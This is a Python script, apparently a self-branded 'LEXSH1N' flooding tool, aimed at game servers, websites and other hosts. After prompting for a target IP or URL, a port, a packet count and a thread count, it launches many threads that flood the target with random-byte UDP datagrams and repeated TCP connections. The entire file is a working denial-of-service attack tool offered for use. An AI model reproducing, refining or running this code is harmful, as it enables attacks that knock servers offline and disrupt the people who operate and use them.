import random
import socket
import threading
import os,sys
os.system("clear")
print("Credit By LEXSH1N:SAMP")
print("SAMP | WEBSITE | GTPS | UDP/TCP")
ip = str(input("[ENTER] Host/Url:"))
port = int(input("[ENTER] Port:"))
choice = str(input("[ENTER] Enter Y to Start(y/n):"))
times = int(input("[ENTER]Packets:"))
threads = int(input("[ENTER] Threads:"))
os.system("clear")
def run():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            print("Connecting Error/Server Down")
def run2():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            s.close()
            print("Connecting Error/Server Down")
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            s.close()
            print("Connecting Error/Server Down")

def run4():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attacking By [LEXSH1N] Sent To Ip : %sAnd Try sent To Port : %s"%(ip, port))
        except:
            s.close()
            print("Connecting Error/Server Down")
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
    else:
        th = threading.Thread(target = run4)
        th.start()